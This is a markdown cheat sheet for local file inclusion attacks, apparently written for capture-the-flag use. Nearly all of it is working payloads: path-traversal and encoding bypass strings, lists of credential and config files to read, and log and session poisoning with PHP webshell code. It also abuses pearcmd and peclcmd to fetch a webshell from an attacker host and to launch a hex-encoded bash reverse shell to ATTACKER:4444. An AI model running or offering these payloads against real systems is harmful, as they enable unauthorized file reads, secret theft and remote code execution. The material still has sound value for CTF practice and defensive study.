# LFI

## Try

```text
../../../../flag.txt
..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252f%252e%252e%252fflag.txt
....//....//....//flag.txt
..;/..;/..;/flag.txt
..%5c..%5c..%5cflag.txt
/proc/self/cwd/flag.txt
/proc/1/root/flag.txt
```

## Traversal

```text
/?file=/flag.txt
/?file=/etc/passwd
/?file=/proc/self/environ
/?file=/proc/self/cmdline
/?file=/app/.env
/?file=/var/www/html/.env
/?file=/var/log/nginx/access.log
/?file=php://filter/convert.base64-encode/resource=index.php
/?file=php://filter/convert.base64-encode/resource=/flag.txt
/?file=php://filter/zlib.deflate/convert.base64-encode/resource=/flag.txt
/?file=/proc/self/fd/0
/?file=/proc/self/fd/1
/?file=/proc/self/fd/2
/?file=/proc/self/fd/3
```

* Basic:\
  `/etc/passwd`, `../../../../etc/passwd`
* PHP Wrapper:\
  `?page=php://filter/convert.base64-encode/resource=index.php`

[https://hackmd.io/@LightSheng/ByrFtyaQp](https://hackmd.io/@LightSheng/ByrFtyaQp)<br>

## Find PHP Gadgets

```bash
docker compose up -d
docker compose exec app sh -lc 'find / -name "*.php" 2>/dev/null | head -100'
docker compose exec app sh -lc 'find / -writable -type d 2>/dev/null | head -100'
docker compose exec app sh -lc 'ls -la /proc/self/fd /tmp /var/tmp /dev/shm 2>/dev/null'
```

```text
/usr/local/lib/php/pearcmd.php
/usr/local/lib/php/peclcmd.php
/var/log/nginx/access.log
/proc/self/environ
```

## High-Value Read Targets

Generic:

```text
/flag
/flag.txt
/readflag
/app/flag.txt
/home/ctf/flag.txt
/etc/passwd
/etc/hostname
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
/proc/self/root
/proc/self/mountinfo
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
```

PHP:

```text
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/composer.json
/var/www/html/vendor/autoload.php
/usr/local/etc/php/conf.d/docker-php-ext-*.ini
/usr/local/etc/php/php.ini
```

Python:

```text
/app/app.py
/app/main.py
/app/config.py
/app/requirements.txt
/app/pyproject.toml
/app/instance/config.py
```

Node:

```text
/app/server.js
/app/app.js
/app/index.js
/app/package.json
/app/package-lock.json
/app/.env
```

Java/Spring:

```text
/app/src/main/resources/application.properties
/app/src/main/resources/application.yml
/app/target/classes/application.properties
/app/target/classes/application.yml
```

## Bypass

```text
....//....//....//flag.txt
..././..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252fetc%252fpasswd
..\..\..\flag.txt
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
....\/....\/....\/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

Prefix/suffix filters:

```text
# App prepends /var/www/html/pages/
../../../etc/passwd
/proc/self/cwd/index.php

# App appends .php
php://filter/convert.base64-encode/resource=index
../../../etc/passwd%00
../../../etc/passwd/.            # if normalize/open accepts directory-ish suffix
../../../etc/passwd%2f..%2f..%2f

# App blocks "../"
....//....//....//etc/passwd
..././..././..././etc/passwd
..%252f..%252f..%252fetc/passwd

# App requires extension/image path
shell.php%00.jpg
php://filter/convert.base64-encode/resource=shell.jpg
zip://upload.jpg%23shell.php
```

Windows:

```text
C:\Windows\win.ini
C:/Windows/win.ini
..\..\..\Windows\win.ini
C:\xampp\htdocs\index.php
C:\inetpub\wwwroot\web.config
```

## Read After LFI

1. App source: routes, templates, middleware, validators.
2. Config: `.env`, `config.py`, `settings.py`, `application.yml`, `composer.json`.
3. Secrets: Flask/Django secret, JWT secret, Rails `secret_key_base`.
4. Runtime: `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd`.
5. Writable targets: access logs, uploads, temp folders, session files.

```text
/?file=/app/app.py
/?file=/app/config.py
/?file=/app/package.json
/?file=/var/www/html/index.php
/?file=/var/www/html/composer.json
```

## LFI2RCE Checklist

```text
Can include php://input? POST raw PHP.
Can include data://? Inline base64 PHP.
Can include uploaded file? Upload polyglot/image with PHP.
Can include log file? Poison User-Agent / request path.
Can include session file? Poison session variable / upload progress.
Can include /proc/self/environ? Poison User-Agent env on CGI/FPM setups.
Can include /proc/self/fd/N? Race temp uploads or find open log/tmp fd.
Can include pearcmd/peclcmd? Write file or run tests.
Can include phar://? Trigger metadata deserialization via file functions.
```

## LFI2RCE via Logs

Poison access log:

```bash
curl 'http://TARGET/<?=$_GET[0]($_GET[1]);?>' -A '<?=$_GET[0]($_GET[1]);?>'
curl 'http://TARGET/?file=/var/log/nginx/access.log&0=system&1=id'
curl 'http://TARGET/?file=/var/log/apache2/access.log&0=system&1=id'
```

Common logs:

```text
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/auth.log
/var/log/secure
```

SSH/auth log poisoning when exposed:

```bash
ssh '<?php system($_GET[0]); ?>'@TARGET
curl 'http://TARGET/?file=/var/log/auth.log&0=id'
```

## LFI2RCE via Sessions

PHP session paths:

```text
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php/session/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
```

Poison session:

```bash
curl 'http://TARGET/' -H 'Cookie: PHPSESSID=pwn' -d 'name=<?=$_GET[0]($_GET[1]);?>'
curl 'http://TARGET/?file=/var/lib/php/sessions/sess_pwn&0=system&1=id'
```

Upload progress trick:

```bash
curl 'http://TARGET/upload' \
  -H 'Cookie: PHPSESSID=pwn' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?=$_GET[0]($_GET[1]);?>' \
  -F 'file=@x'
curl 'http://TARGET/?file=/var/lib/php/sessions/sess_pwn&0=system&1=id'
```

## LFI2RCE via pearcmd / peclcmd

Works when LFI can include PEAR/PECL helper PHP and query args are parsed as CLI argv.

### Find Utility

```text
/?file=/usr/local/lib/php/peclcmd.php
/?file=/usr/local/lib/php/pearcmd.php
/?file=../../../../usr/local/lib/php/peclcmd.php
/?file=..././..././..././usr/local/lib/php/peclcmd.php
```

### Install Package Webshell

```text
/?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/shell.tgz+&file=../../../../usr/local/lib/php/peclcmd.php
/?file=/tmp/pwn/usr/local/lib/php/PKG-1.0.0/PKG.php&cmd=id
```

### Write PHP With config-create

```text
/?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=../../../../usr/local/lib/php/pearcmd.php
/?file=/tmp/s.php&0=id
```

### run-tests One Shot

```bash
cmd="bash -c 'sh -i >& /dev/tcp/ATTACKER/4444 0>&1'"
curl "http://TARGET/?+run-tests+-i+-r\"system(hex2bin('$(printf %s "$cmd" | xxd -p -c 256)'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt&file=../../../../usr/local/lib/php/peclcmd.php"

```

## LFI2RCE via php filter chain

Use [PHP](php.md) for wrappers, filter chains, and webshell variants.

## CVE-Class PHP LFI Gadgets

Names to remember/search:

```text
PHP-CGI argument injection:
  CVE-2012-1823 classic php-cgi arg injection.
  CVE-2024-4577 Windows best-fit php-cgi arg injection.
  Not really LFI; useful when PHP-CGI parses query string as command flags.

PHP filter / iconv CNEXT:
  CVE-2024-2961 glibc iconv ISO-2022-CN-EXT bug.
  Can upgrade some PHP file-read / php://filter primitives to RCE.

pearcmd / peclcmd:
  Include PEAR helper scripts and abuse query string as argv to write/run PHP.

PHAR metadata:
  File functions touching phar:// can trigger unserialize if gadgets exist.
```

Decision:

```text
Can only include PHP? Try php://input, data://, sessions, logs, pearcmd.
Can only read files but php://filter works? Check CNEXT / CVE-2024-2961.
Can hit php-cgi directly? Check `?-s`, `?-d`, `%ADd`.
Can call file_exists/getimagesize on user path? Check phar:// deserialization.
```

## References

* [HackTricks LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
* [Advanced pearcmd notes](https://hackmd.io/@LightSheng/ByrFtyaQp)
* [LFI RCE Cheat Sheet](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
